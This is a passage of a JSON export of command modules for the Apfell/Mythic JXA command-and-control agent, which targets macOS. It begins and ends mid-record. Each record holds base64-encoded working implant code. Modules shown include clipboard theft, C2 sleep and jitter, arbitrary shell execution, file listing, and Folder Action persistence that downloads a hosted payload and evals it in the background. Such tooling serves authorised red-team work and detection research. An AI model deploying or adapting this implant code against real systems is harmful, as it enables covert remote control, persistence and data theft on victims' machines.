          "browser_script": "ZnVuY3Rpb24odGFzaywgcmVzcG9uc2UpewoJaWYodGFzay5zdGF0dXMgPT09ICdlcnJvcicpewoJCXJldHVybiAiPHByZT4gRXJyb3I6IHVudG9nZ2xlIGZvciBlcnJvciBtZXNzYWdlKHMpIDwvcHJlPiI7Cgl9CiAgbGV0IHJvd3MgPSBbXTsKICBmb3IobGV0IGkgPSAwOyBpIDwgcmVzcG9uc2UubGVuZ3RoOyBpKyspewogICAgdHJ5ewogICAgICAgIGxldCBkYXRhID0gSlNPTi5wYXJzZShyZXNwb25zZVtpXVsncmVzcG9uc2UnXSk7CiAgICAgICAgbGV0IHJvd19zdHlsZSA9ICIiOwogIAkJCWxldCBjZWxsX3N0eWxlID0ge307CgkJICAgIE9iamVjdC5rZXlzKGRhdGEpLmZvckVhY2goZnVuY3Rpb24oeCl7CgkJICAgICAgdmFyIHIgPSBkYXRhW3hdOwoJCSAgICAgIHZhciByb3dfc3R5bGUgPSAiIjsKCQkgICAgICBpZihyWyduYW1lJ10uaW5jbHVkZXMoIjFQYXNzd29yZCIpKXtyb3dfc3R5bGU9ImJhY2tncm91bmQtY29sb3I6Z3JlZW47Y29sb3I6d2hpdGUifQoJCSAgICAgIGlmKHJbJ25hbWUnXS5pbmNsdWRlcygiVGVybSIpKXtyb3dfc3R5bGU9ImJhY2tncm91bmQtY29sb3I6cmVkO2NvbG9yOndoaXRlIn0KCQkgICAgICBpZihyWyduYW1lJ10uaW5jbHVkZXMoIlNuaXRjaCIpKXtyb3dfc3R5bGU9ImJhY2tncm91bmQtY29sb3I6cmVkO2NvbG9yOndoaXRlIn0KCQkgICAgICByb3dzLnB1c2goeyJwaWQiOiByWydwcm9jZXNzX2lkJ10sCgkJICAgICAgICAgICAgICAgICAibmFtZSI6IHJbJ25hbWUnXSwKCQkgICAgICAgICAgICAgICAgICJhcmNoIjogclsnYXJjaGl0ZWN0dXJlJ10sCgkJICAgICAgICAgICAgICAgICAiZnJvbnRNb3N0IjogclsnZnJvbnRNb3N0J10sCgkJICAgICAgICAgICAgICAgICAiYmluX3BhdGgiOiByWydiaW5fcGF0aCddLAoJCSAgICAgICAgICAgICAgICAgInJvdy1zdHlsZSI6IHJvd19zdHlsZSwKCQkgICAgICAgICAgICAgICAgICJjZWxsLXN0eWxlIjogeyJoaWRkZW4iOiAidGV4dC1hbGlnbjpjZW50ZXIiLAoJCSAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgInBpZCI6InRleHQtYWxpZ246Y2VudGVyIn0KCQkgICAgICAgICAgICAgICAgIH0pOwoJCSAgICB9KTsKICAgIH0KICAgIGNhdGNoKGVycm9yKXsKICAgICAgICAiPHByZT5FcnJvcjogIiArIGVycm9yLnRvU3RyaW5nKCkgKyAiXG4iICsgSlNPTi5zdHJpbmdpZnkocmVzcG9uc2UsIG51bGwsIDIpICsgIjwvcHJlPiI7CiAgICB9CiAgfQogIGxldCBvdXRwdXQgPSBzdXBwb3J0X3NjcmlwdHNbJ2NyZWF0ZV90YWJsZSddKFt7Im5hbWUiOiJwaWQiLCJzaXplIjoiMmVtIn0seyJuYW1lIjoiYXJjaCIsInNpemUiOiIyZW0ifSx7Im5hbWUiOiJuYW1lIiwgInNpemUiOiIxMGVtIn0sIHsibmFtZSI6ImZyb250TW9zdCIsInNpemUiOiIzZW0ifSx7Im5hbWUiOiJiaW5fcGF0aCIsInNpemUiOiIyMGVtIn1dLCByb3dzKTsKICByZXR1cm4gb3V0cHV0Owp9"
        },
        {
          "needs_admin": false,
          "help_cmd": "sleep {integer interval}",
          "version": 2,
          "is_exit": false,
          "is_file_browse": false,
          "file_browse_parameters": "",
          "is_process_list": false,
          "process_list_parameters": "",
          "is_download_file": false,
          "download_file_parameters": "",
          "is_remove_file": false,
          "remove_file_parameters": "",
          "is_agent_generator": false,
          "author": "",
          "deleted": false,
          "description": "Modify the time between callbacks in seconds.",
          "cmd": "sleep",
          "parameters": [
            {
              "type": "Number",
              "hint": "",
              "choices": "",
              "required": false,
              "name": "jitter"
            },
            {
              "type": "Number",
              "hint": "",
              "choices": "",
              "required": false,
              "name": "interval"
            }
          ],
          "attack": [
            {
              "t_num": "T1029",
              "attack_name": "Scheduled Transfer"
            }
          ],
          "artifacts": [],
          "files": [
            {
              "sleep.js": "ZXhwb3J0cy5zbGVlcCA9IGZ1bmN0aW9uKHRhc2ssIGNvbW1hbmQsIHBhcmFtcyl7CiAgICB0cnl7CiAgICAgICAgbGV0IGNvbW1hbmRfcGFyYW1zID0gSlNPTi5wYXJzZShwYXJhbXMpOwogICAgICAgIGlmKGNvbW1hbmRfcGFyYW1zLmhhc093blByb3BlcnR5KCdpbnRlcnZhbCcpICYmIGNvbW1hbmRfcGFyYW1zWydpbnRlcnZhbCddID49IDApewogICAgICAgICAgICBDMi5pbnRlcnZhbCA9IGNvbW1hbmRfcGFyYW1zWydpbnRlcnZhbCddOwogICAgICAgIH0KICAgICAgICBpZihjb21tYW5kX3BhcmFtcy5oYXNPd25Qcm9wZXJ0eSgnaml0dGVyJykgJiYgY29tbWFuZF9wYXJhbXNbJ2ppdHRlciddID49IDAgJiYgY29tbWFuZF9wYXJhbXNbJ2ppdHRlciddIDw9IDEwMCl7CiAgICAgICAgICAgIEMyLmppdHRlciA9IGNvbW1hbmRfcGFyYW1zWydqaXR0ZXInXTsKICAgICAgICB9CiAgICAgICAgcmV0dXJuIHsidXNlcl9vdXRwdXQiOiJTbGVlcCBpbnRlcnZhbCB1cGRhdGVkIHRvICIgKyBDMi5pbnRlcnZhbCArICIgYW5kIHNsZWVwIGppdHRlciB1cGRhdGVkIHRvICIgKyBDMi5qaXR0ZXIsICJjb21wbGV0ZWQiOiB0cnVlfTsKICAgIH1jYXRjaChlcnJvcil7CiAgICAgICAgcmV0dXJuIHsidXNlcl9vdXRwdXQiOmVycm9yLnRvU3RyaW5nKCksICJjb21wbGV0ZWQiOiB0cnVlLCAic3RhdHVzIjogImVycm9yIn07CiAgICB9Cn07CgpDT01NQU5EX0VORFNfSEVSRQ=="
            }
          ],
          "transforms": [
            {
              "order": 1,
              "parameter": "",
              "active": true,
              "description": "",
              "timestamp": "05\/07\/2020 07:01:49",
              "command": "sleep",
              "command_id": 54,
              "payload_type": "apfell-jxa",
              "transform": "apfelljxa_sleep_shorthand",
              "parameter_type": "None"
            }
          ]
        },
        {
          "needs_admin": false,
          "help_cmd": "clipboard [data]",
          "version": 3,
          "is_exit": false,
          "is_file_browse": false,
          "file_browse_parameters": "",
          "is_process_list": false,
          "process_list_parameters": "",
          "is_download_file": false,
          "download_file_parameters": "",
          "is_remove_file": false,
          "remove_file_parameters": "",
          "is_agent_generator": false,
          "author": "",
          "deleted": false,
          "description": "This will return the current clipboard contents on the target machine. If [data] is supplied, it will set the clipboard to [data].",
          "cmd": "clipboard",
          "parameters": [],
          "attack": [
            {
              "t_num": "T1115",
              "attack_name": "Clipboard Data"
            }
          ],
          "artifacts": [],
          "files": [
            {
              "clipboard.js": "ZXhwb3J0cy5jbGlwYm9hcmQgPSBmdW5jdGlvbih0YXNrLCBjb21tYW5kLCBwYXJhbXMpewogICAgbGV0IHJlc3BvbnNlID0gIiI7CiAgICBPYmpDLmltcG9ydCgnQXBwS2l0Jyk7CiAgICBpZihwYXJhbXMgIT09IHVuZGVmaW5lZCAmJiBwYXJhbXMgIT09ICIiKXsKICAgICAgICAvLyBUcnkgc2V0dGluZyB0aGUgY2xpcGJvYXJkIHRvIHdoYXRldmVyIGlzIGluIHBhcmFtcwogICAgICAgIHRyeXsKICAgICAgICAgICAgJC5OU1Bhc3RlYm9hcmQuZ2VuZXJhbFBhc3RlYm9hcmQuY2xlYXJDb250ZW50czsKICAgICAgICAgICAgJC5OU1Bhc3RlYm9hcmQuZ2VuZXJhbFBhc3RlYm9hcmQuc2V0U3RyaW5nRm9yVHlwZSgkKHBhcmFtcyksICQuTlNQYXN0ZWJvYXJkVHlwZVN0cmluZyk7CiAgICAgICAgICAgIHJldHVybiB7InVzZXJfb3V0cHV0IjogIlN1Y2Nlc3NmdWxseSBzZXQgdGhlIGNsaXBib2FyZCIsICJjb21wbGV0ZWQiOiB0cnVlfTsKICAgICAgICB9CiAgICAgICAgY2F0Y2goZXJyb3IpewogICAgICAgICAgICByZXR1cm4geyJ1c2VyX291dHB1dCI6ZXJyb3IudG9TdHJpbmcoKSwgImNvbXBsZXRlZCI6IHRydWUsICJzdGF0dXMiOiAiZXJyb3IifTsKICAgICAgICB9CiAgICB9CiAgICBlbHNlewogICAgICAgIC8vdHJ5IGp1c3QgcmVhZGluZyB0aGUgY2xpcGJvYXJkIGRhdGEgYW5kIHJldHVybmluZyBpdAogICAgICAgIHRyeXsKICAgICAgICAgICAgbGV0IHBiID0gJC5OU1Bhc3RlYm9hcmQuZ2VuZXJhbFBhc3RlYm9hcmQ7CiAgICAgICAgICAgIGxldCBvdXRwdXQgPSBwYi5zdHJpbmdGb3JUeXBlKCQuTlNQYXN0ZWJvYXJkVHlwZVN0cmluZykuanM7CiAgICAgICAgICAgIC8vdmFyIG91dHB1dCA9IGN1cnJlbnRBcHAudGhlQ2xpcGJvYXJkKCk7CiAgICAgICAgICAgIGlmKG91dHB1dCA9PT0gIiIgfHwgb3V0cHV0ID09PSB1bmRlZmluZWQpewogICAgICAgICAgICAgICAgcmV0dXJuIHsidXNlcl9vdXRwdXQiOiJOb3RoaW5nIG9uIHRoZSBjbGlwYm9hcmQiLCAiY29tcGxldGVkIjogdHJ1ZX07CiAgICAgICAgICAgIH0KICAgICAgICAgICAgcmV0dXJuIHsidXNlcl9vdXRwdXQiOiBTdHJpbmcob3V0cHV0KSwgImNvbXBsZXRlZCI6IHRydWV9OwogICAgICAgIH0KICAgICAgICBjYXRjaChlcnJvcil7CiAgICAgICAgICAgIHJldHVybiB7InVzZXJfb3V0cHV0IjplcnJvci50b1N0cmluZygpLCAiY29tcGxldGVkIjogdHJ1ZSwgInN0YXR1cyI6ICJlcnJvciJ9OwogICAgICAgIH0KICAgIH0KfTsKQ09NTUFORF9FTkRTX0hFUkU="
            }
          ],
          "transforms": []
        },
        {
          "needs_admin": false,
          "help_cmd": "persist_folderaction {\"folder\": \"\/path\/to\/folder\", \"script_path\": \"\/path\/to\/script\/to\/put\/on\/disk.scpt\", \"url\": \"http:\/\/url.of.hosted\/payload\"}",
          "version": 1,
          "is_exit": false,
          "is_file_browse": false,
          "file_browse_parameters": "",
          "is_process_list": false,
          "process_list_parameters": "",
          "is_download_file": false,
          "download_file_parameters": "",
          "is_remove_file": false,
          "remove_file_parameters": "",
          "is_agent_generator": false,
          "author": "",
          "deleted": false,
          "description": "Use Folder Actions to persist a compiled script on disk. You can either specify a 'URL' and automatically do a backgrounding one-liner, or supply your own code and language.",
          "cmd": "persist_folderaction",
          "parameters": [
            {
              "type": "String",
              "hint": "osascript code",
              "choices": "",
              "required": false,
              "name": "code"
            },
            {
              "type": "String",
              "hint": "http:\/\/url.of.hosted\/payload",
              "choices": "",
              "required": false,
              "name": "url"
            },
            {
              "type": "String",
              "hint": "\/path\/to\/folder\/to\/watch",
              "choices": "",
              "required": true,
              "name": "folder"
            },
            {
              "type": "String",
              "hint": "\/path\/to\/script\/to\/create\/on\/disk",
              "choices": "",
              "required": true,
              "name": "script_path"
            },
            {
              "type": "Choice",
              "hint": "",
              "choices": "JavaScript\nAppleScript",
              "required": false,
              "name": "language"
            }
          ],
          "attack": [],
          "artifacts": [],
          "files": [
            {
              "persist_folderaction.js": "ZXhwb3J0cy5wZXJzaXN0X2ZvbGRlcmFjdGlvbiA9IGZ1bmN0aW9uKHRhc2ssIGNvbW1hbmQsIHBhcmFtcyl7CiAgICB0cnl7CiAgICAJLy8gPT09PT09PSBHZXQgcGFyYW1zID09PT09PT09CiAgICAJbGV0IGpzb25fcGFyYW1zID0gSlNPTi5wYXJzZShwYXJhbXMpOwogICAgCWxldCBmb2xkZXIgPSBqc29uX3BhcmFtc1snZm9sZGVyJ107CiAgICAJbGV0IHNjcmlwdF9wYXRoID0ganNvbl9wYXJhbXNbJ3NjcmlwdF9wYXRoJ107CiAgICAJbGV0IHVybCA9IGpzb25fcGFyYW1zWyd1cmwnXTsKICAgIAlsZXQgY29kZSA9IGpzb25fcGFyYW1zWydjb2RlJ107CiAgICAJbGV0IGxhbmcgPSBqc29uX3BhcmFtc1snbGFuZ3VhZ2UnXTsKICAgIAlsZXQgY29kZTEgPSAidmFyIGFwcCA9IEFwcGxpY2F0aW9uLmN1cnJlbnRBcHBsaWNhdGlvbigpO1xuIiArCiAgICAgICAgICAgICAgICAgICAgImFwcC5pbmNsdWRlU3RhbmRhcmRBZGRpdGlvbnMgPSB0cnVlO1xuIiArCiAgICAgICAgICAgICAgICAgICAgImFwcC5kb1NoZWxsU2NyaXB0KFwiIG9zYXNjcmlwdCAtbCBKYXZhU2NyaXB0IC1lIFxcXCJldmFsKE9iakMudW53cmFwKCQuTlNTdHJpbmcuYWxsb2MuaW5pdFdpdGhEYXRhRW5jb2RpbmcoJC5OU0RhdGEuZGF0YVdpdGhDb250ZW50c09mVVJMKCQuTlNVUkwuVVJMV2l0aFN0cmluZygnIjsKCQlsZXQgY29kZTIgPSAiJykpLCQuTlNVVEY4U3RyaW5nRW5jb2RpbmcpKSk7XFxcIiAmPiAvZGV2L251bGwgJlwiKTsiOwoJCWxldCBvdXRwdXQgPSAiIjsKICAgIAkvLyA9PT09PT09PSBDb21waWxlIGFuZCB3cml0ZSBzY3JpcHQgdG8gZmlsZSA9PT09PT09PT09CiAgICAJT2JqQy5pbXBvcnQoJ09TQUtpdCcpOwogICAgCWxldCBteWxhbmcgPSAiIjsKICAgIAlsZXQgbXlzY3JpcHQgPSAiIjsKICAgIAlpZihjb2RlICE9PSAiIil7CiAgICAJCW15bGFuZyA9ICQuT1NBTGFuZ3VhZ2UubGFuZ3VhZ2VGb3JOYW1lKGxhbmcpOwogICAgCQlteXNjcmlwdCA9ICQuT1NBU2NyaXB0LmFsbG9jLmluaXRXaXRoU291cmNlTGFuZ3VhZ2UoJChjb2RlKSxteWxhbmcpOwogICAgCX1lbHNlewogICAgCQlteWxhbmcgPSAkLk9TQUxhbmd1YWdlLmxhbmd1YWdlRm9yTmFtZSgiSmF2YVNjcmlwdCIpOwogICAgCQlteXNjcmlwdCA9ICQuT1NBU2NyaXB0LmFsbG9jLmluaXRXaXRoU291cmNlTGFuZ3VhZ2UoJChjb2RlMSArIHVybCArIGNvZGUyKSxteWxhbmcpOwogICAgCX0KCgkJbXlzY3JpcHQuY29tcGlsZUFuZFJldHVybkVycm9yKCQoKSk7CgkJbGV0IGRhdGEgPSBteXNjcmlwdC5jb21waWxlZERhdGFGb3JUeXBlVXNpbmdTdG9yYWdlT3B0aW9uc0Vycm9yKCJvc2FzIiwgMHgwMDAwMDAwMywgJCgpKTsKCQlkYXRhLndyaXRlVG9GaWxlQXRvbWljYWxseShzY3JpcHRfcGF0aCwgdHJ1ZSk7CgkJLy8gPT09PT09PSBIYW5kbGUgdGhlIGZvbGRlciBhY3Rpb24gcGVyc2lzdGVuY2UgPT09PT09PQogICAgICAgIGxldCBzZSA9IEFwcGxpY2F0aW9uKCJTeXN0ZW0gRXZlbnRzIik7CgkJc2UuZm9sZGVyQWN0aW9uc0VuYWJsZWQgPSB0cnVlOwoJCWxldCBmYV9leGlzdHMgPSBmYWxzZTsKCQlsZXQgc2NyaXB0X2V4aXN0cyA9IGZhbHNlOwoJCWxldCBteVNjcmlwdCA9IHNlLlNjcmlwdCh7bmFtZTogc2NyaXB0X3BhdGguc3BsaXQoIi8iKS5wb3AoKSwgcG9zaXhQYXRoOiBzY3JpcHRfcGF0aH0pOwoJCWxldCBmYSA9IHNlLkZvbGRlckFjdGlvbih7bmFtZTogZm9sZGVyLnNwbGl0KCIvIikucG9wKCksIHBhdGg6IGZvbGRlcn0pOwoJCS8vIGZpcnN0IGNoZWNrIHRvIHNlZSBpZiB0aGVyZSdzIGEgZm9sZGVyIGFjdGlvbiBmb3IgdGhlIHBhdGggd2UncmUgbG9va2luZyBhdAoJCWZvcihsZXQgaSA9IDA7IGkgPCBzZS5mb2xkZXJBY3Rpb25zLmxlbmd0aDsgaSsrKXsKCQkJaWYoc2UuZm9sZGVyQWN0aW9uc1tpXS5wYXRoKCkgPT09IGZvbGRlcil7CgkJCQkvLyBpZiBvdXIgZm9sZGVyIGFscmVhZHkgaGFzIGZvbGRlciBhY3Rpb25zLCBqdXN0IHRha2UgdGhlIHJlZmVyZW5jZSBmb3IgbGF0ZXIKCQkJCWZhID0gc2UuZm9sZGVyQWN0aW9uc1tpXTsKCQkJCWZhX2V4aXN0cyA9IHRydWU7CgkJCQlvdXRwdXQgKz0gIkZvbGRlciBhbHJlYWR5IGhhcyBmb2xkZXIgYWN0aW9uc1xuIjsKCQkJCWJyZWFrOwoJCQl9CgkJfQoJCS8vIGlmIHRoZSBmb2xkZXIgYWN0aW9uIGRvZXNuJ3QgZXhpc3QsIGFkZCBpdAoJCWlmKGZhX2V4aXN0cyA9PT0gZmFsc2UpewoJCQlzZS5mb2xkZXJBY3Rpb25zLnB1c2goZmEpOwoJCX0KCQkvLyBDaGVjayB0byBzZWUgaWYgdGhpcyBzY3JpcHQgYWxyZWFkeSBleGlzdHMgb24gdGhpcyBmb2xkZXIKCQlmb3IobGV0IGkgPSAwOyBpIDwgZmEuc2NyaXB0cy5sZW5ndGg7IGkrKyl7CgkJCWlmKGZhLnNjcmlwdHNbaV0ucG9zaXhQYXRoKCkgPT09ICBzY3JpcHRfcGF0aCl7CgkJCQlzY3JpcHRfZXhpc3RzID0gdHJ1ZTsKCQkJCW91dHB1dCArPSAiU2NyaXB0IGFscmVhZHkgYXNzaWduZWQgdG8gdGhpcyBmb2xkZXJcbiI7CgkJCQlicmVhazsKCQkJfQoJCX0KCQlpZihzY3JpcHRfZXhpc3RzID09PSBmYWxzZSl7CgkJCWZhLnNjcmlwdHMucHVzaChteVNjcmlwdCk7CgkJfQoJCW91dHB1dCArPSAiRm9sZGVyIEFjdGlvbiBlc3RhYmxpc2hlZCI7CgkJcmV0dXJuIHsidXNlcl9vdXRwdXQiOm91dHB1dCwgImNvbXBsZXRlZCI6IHRydWV9OwogICAgfWNhdGNoKGVycm9yKXsKICAgICAgICByZXR1cm4geyJ1c2VyX291dHB1dCI6ZXJyb3IudG9TdHJpbmcoKSwgImNvbXBsZXRlZCI6IHRydWUsICJzdGF0dXMiOiAiZXJyb3IifTsKICAgIH0KfTsKQ09NTUFORF9FTkRTX0hFUkU="
            }
          ],
          "transforms": []
        },
        {
          "needs_admin": false,
          "help_cmd": "shell {command}",
          "version": 3,
          "is_exit": false,
          "is_file_browse": false,
          "file_browse_parameters": "",
          "is_process_list": false,
          "process_list_parameters": "",
          "is_download_file": false,
          "download_file_parameters": "",
          "is_remove_file": false,
          "remove_file_parameters": "",
          "is_agent_generator": false,
          "author": "",
          "deleted": false,
          "description": "This runs {command} in a terminal by leveraging JXA's Application.doShellScript({command}).\n\nWARNING! THIS IS SINGLE THREADED, IF YOUR COMMAND HANGS, THE AGENT HANGS!",
          "cmd": "shell",
          "parameters": [
            {
              "type": "String",
              "hint": "",
              "choices": "",
              "required": true,
              "name": "command"
            }
          ],
          "attack": [
            {
              "t_num": "T1059",
              "attack_name": "Command-Line Interface"
            }
          ],
          "artifacts": [
            {
              "command_parameter": "command",
              "artifact": "Process Create",
              "artifact_string": "sh -c *",
              "replace_string": "*"
            }
          ],
          "files": [
            {
              "shell.js": "ZXhwb3J0cy5zaGVsbCA9IGZ1bmN0aW9uKHRhc2ssIGNvbW1hbmQsIHBhcmFtcyl7CgkvL3NpbXBseSBydW4gYSBzaGVsbCBjb21tYW5kIHZpYSBkb1NoZWxsU2NyaXB0IGFuZCByZXR1cm4gdGhlIHJlc3BvbnNlCglsZXQgcmVzcG9uc2UgPSAiIjsKCXRyeXsKCQlsZXQgY29tbWFuZF9wYXJhbXMgPSBKU09OLnBhcnNlKHBhcmFtcyk7CgkJbGV0IGNvbW1hbmQgPSBjb21tYW5kX3BhcmFtc1snY29tbWFuZCddOwoJICAgIGlmKGNvbW1hbmRbY29tbWFuZC5sZW5ndGgtMV0gPT09ICImIil7CgkgICAgICAgIC8vZG9TaGVsbFNjcmlwdCBhY3R1YWxseSBkb2VzIG1hY09TJyAvYmluL3NoIHdoaWNoIGlzIGFjdHVhbGx5IGJhc2ggZW11bGF0aW5nIHNoCgkgICAgICAgIC8vICBzbyB0byBhY3R1YWxseSBiYWNrZ3JvdW5kIGEgdGFzaywgeW91IG5lZWQgIiY+IC9kZXYvbnVsbCAmIiBhdCB0aGUgZW5kCgkgICAgICAgIC8vICBzbyBJJ2xsIGp1c3QgYXV0b21hdGljYWxseSBmaXggdGhpcyBzbyBpdCdzIG5vdCB3ZWlyZCBmb3IgdGhlIG9wZXJhdG9yCgkgICAgICAgIGNvbW1hbmQgPSBjb21tYW5kICsgIj4gL2Rldi9udWxsICYiOwoJICAgIH0KCQlyZXNwb25zZSA9IGN1cnJlbnRBcHAuZG9TaGVsbFNjcmlwdChjb21tYW5kKTsKCQlpZihyZXNwb25zZSA9PT0gdW5kZWZpbmVkIHx8IHJlc3BvbnNlID09PSAiIil7CgkJICAgIHJlc3BvbnNlID0gIk5vIENvbW1hbmQgT3V0cHV0IjsKCQl9CgkJLy8gc2hlbGwgb3V0cHV0IHVzZXMgXHIgaW5zdGVhZCBvZiBcbiBvciBcclxuIHRvIGxpbmUgZW5kaW5ncywgZml4IHRoaXMgbm9uc2Vuc2UKCQlyZXNwb25zZSA9IHJlc3BvbnNlLnJlcGxhY2UoL1xyL2csICJcbiIpOwoJCXJldHVybiB7InVzZXJfb3V0cHV0IjpyZXNwb25zZSwgImNvbXBsZXRlZCI6IHRydWV9OwoJfQoJY2F0Y2goZXJyb3IpewoJCXJlc3BvbnNlID0gZXJyb3IudG9TdHJpbmcoKS5yZXBsYWNlKC9cci9nLCAiXG4iKTsKCQlyZXR1cm4geyJ1c2VyX291dHB1dCI6cmVzcG9uc2UsICJjb21wbGV0ZWQiOiB0cnVlLCAic3RhdHVzIjogImVycm9yIn07Cgl9Cn07CkNPTU1BTkRfRU5EU19IRVJF"
            }
          ],
          "transforms": [
            {
              "order": 1,
              "parameter": "command",
              "active": true,
              "description": "",
              "timestamp": "05\/07\/2020 07:01:49",
              "command": "shell",
              "command_id": 63,
              "payload_type": "apfell-jxa",
              "transform": "jsonSingleParameter",
              "parameter_type": "String"
            }
          ]
        },
        {
          "needs_admin": false,
          "help_cmd": "ls \/path\/to\/file",
          "version": 2,
          "is_exit": false,
          "is_file_browse": false,
          "file_browse_parameters": "",
          "is_process_list": false,
          "process_list_parameters": "",
          "is_download_file": false,
          "download_file_parameters": "",
          "is_remove_file": false,
          "remove_file_parameters": "",
          "is_agent_generator": false,
          "author": "",
          "deleted": false,
          "description": "Get attributes about a file and display it to the user via API calls. No need for quotes and relative paths are fine",
          "cmd": "ls",
          "parameters": [
            {
              "type": "String",
              "hint": "",
              "choices": "",
              "required": true,
              "name": "path"
            }
          ],
          "attack": [
            {
              "t_num": "T1106",
              "attack_name": "Execution through API"
            },
            {
              "t_num": "T1083",
              "attack_name": "File and Directory Discovery"
            }
          ],
          "artifacts": [],
          "files": [
            {
              "ls.js": "ZXhwb3J0cy5scyA9IGZ1bmN0aW9uKHRhc2ssIGNvbW1hbmQsIHBhcmFtcyl7CiAgICBPYmpDLmltcG9ydCgnRm91bmRhdGlvbicpOwogICAgdHJ5IHsKICAgICAgICBsZXQgY29tbWFuZF9wYXJhbXMgPSBKU09OLnBhcnNlKHBhcmFtcyk7CiAgICAgICAgbGV0IGZpbGVNYW5hZ2VyID0gJC5OU0ZpbGVNYW5hZ2VyLmRlZmF1bHRNYW5hZ2VyOwogICAgICAgIGxldCBlcnJvciA9IFJlZigpOwogICAgICAgIGxldCBwYXRoID0gY29tbWFuZF9wYXJhbXNbJ3BhdGgnXTsKICAgICAgICBpZiAocGF0aCA9PT0gIiIgfHwgcGF0aCA9PT0gdW5kZWZpbmVkKSB7CiAgICAgICAgICAgIHBhdGggPSBmaWxlTWFuYWdlci5jdXJyZW50RGlyZWN0b3J5UGF0aC5qczsKICAgICAgICAgICAgaWYgKHBhdGggPT09IHVuZGVmaW5lZCB8fCBwYXRoID09PSAiIikgewogICAgICAgICAgICAgICAgcmV0dXJuIHsKICAgICAgICAgICAgICAgICAgICAidXNlcl9vdXRwdXQiOiAiRmFpbGVkIHRvIGdldCBjdXJyZW50IHdvcmtpbmcgZGlyZWN0b3J5IiwKICAgICAgICAgICAgICAgICAgICAiY29tcGxldGVkIjogdHJ1ZSwKICAgICAgICAgICAgICAgICAgICAic3RhdHVzIjogImVycm9yIgogICAgICAgICAgICAgICAgfTsKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICBpZiAocGF0aFswXSA9PT0gJyInKSB7CiAgICAgICAgICAgIHBhdGggPSBwYXRoLnN1YnN0cmluZygxLCBwYXRoLmxlbmd0aCAtIDEpOwogICAgICAgIH0KICAgICAgICBpZihwYXRoWzBdID09PSAnficpewogICAgICAgICAgICBwYXRoID0gJChwYXRoKS5zdHJpbmdCeUV4cGFuZGluZ1RpbGRlSW5QYXRoLmpzOwogICAgICAgIH0KICAgICAgICBsZXQgYXR0cmlidXRlcyA9IE9iakMuZGVlcFVud3JhcChmaWxlTWFuYWdlci5hdHRyaWJ1dGVzT2ZJdGVtQXRQYXRoRXJyb3IoJChwYXRoKSwgZXJyb3IpKTsKICAgICAgICBpZiAoYXR0cmlidXRlcyAhPT0gdW5kZWZpbmVkKSB7CiAgICAgICAgICAgIGF0dHJpYnV0ZXNbJ3R5cGUnXSA9ICJGIjsKICAgICAgICAgICAgYXR0cmlidXRlc1snZmlsZXMnXSA9IFtdOwogICAgICAgICAgICBpZiAoYXR0cmlidXRlcy5oYXNPd25Qcm9wZXJ0eSgnTlNGaWxlVHlwZScpICYmIGF0dHJpYnV0ZXNbJ05TRmlsZVR5cGUnXSA9PT0gIk5TRmlsZVR5cGVEaXJlY3RvcnkiKSB7CiAgICAgICAgICAgICAgICBsZXQgZXJyb3IgPSBSZWYoKTsKICAgICAgICAgICAgICAgIGF0dHJpYnV0ZXNbJ3R5cGUnXSA9ICJEIjsKICAgICAgICAgICAgICAgIGxldCBmaWxlcyA9IE9iakMuZGVlcFVud3JhcChmaWxlTWFuYWdlci5jb250ZW50c09mRGlyZWN0b3J5QXRQYXRoRXJyb3IoJChwYXRoKSwgZXJyb3IpKTsKICAgICAgICAgICAgICAgIGlmIChmaWxlcyAhPT0gdW5kZWZpbmVkKSB7CiAgICAgICAgICAgICAgICAgICAgbGV0IGZpbGVzX2RhdGEgPSBbXTsKICAgICAgICAgICAgICAgICAgICBsZXQgc3ViX2ZpbGVzID0gZmlsZXM7CiAgICAgICAgICAgICAgICAgICAgaWYgKHBhdGhbcGF0aC5sZW5ndGggLSAxXSAhPT0gIi8iKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIHBhdGggPSBwYXRoICsgIi8iOwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBmb3IgKGxldCBpID0gMDsgaSA8IHN1Yl9maWxlcy5sZW5ndGg7IGkrKykgewogICAgICAgICAgICAgICAgICAgICAgICBsZXQgYXR0ciA9IE9iakMuZGVlcFVud3JhcChmaWxlTWFuYWdlci5hdHRyaWJ1dGVzT2ZJdGVtQXRQYXRoRXJyb3IoJChwYXRoICsgc3ViX2ZpbGVzW2ldKSwgZXJyb3IpKTsKICAgICAgICAgICAgICAgICAgICAgICAgbGV0IGZpbGVfYWRkID0ge307CiAgICAgICAgICAgICAgICAgICAgICAgIGZpbGVfYWRkWyduYW1lJ10gPSBzdWJfZmlsZXNbaV07CiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChhdHRyWydOU0ZpbGVUeXBlJ10gPT09ICJOU0ZpbGVUeXBlRGlyZWN0b3J5IikgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgZmlsZV9hZGRbJ3R5cGUnXSA9ICJEIjsKICAgICAgICAgICAgICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZpbGVfYWRkWyd0eXBlJ10gPSAiIjsKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICBsZXQgcGxpc3RQZXJtcyA9IE9iakMudW53cmFwKGZpbGVNYW5hZ2VyLmF0dHJpYnV0ZXNPZkl0ZW1BdFBhdGhFcnJvcigkKHBhdGggKyBzdWJfZmlsZXNbaV0pLCAkKCkpKTsKICAgICAgICAgICAgICAgICAgICAgICAgaWYocGxpc3RQZXJtc1snTlNGaWxlRXh0ZW5kZWRBdHRyaWJ1dGVzJ10gIT09IHVuZGVmaW5lZCl7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBsZXQgZXh0ZW5kZWQgPSB7fTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxldCBwZXJtcyA9IHBsaXN0UGVybXNbJ05TRmlsZUV4dGVuZGVkQXR0cmlidXRlcyddLmpzOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgZm9yKGxldCBqIGluIHBlcm1zKXsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBleHRlbmRlZFtqXSA9IHBlcm1zW2pdLmJhc2U2NEVuY29kZWRTdHJpbmdXaXRoT3B0aW9ucygwKS5qczsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZpbGVfYWRkWydFeHRlbmRlZEF0dHJpYnV0ZXMnXSA9IGV4dGVuZGVkOwogICAgICAgICAgICAgICAgICAgICAgI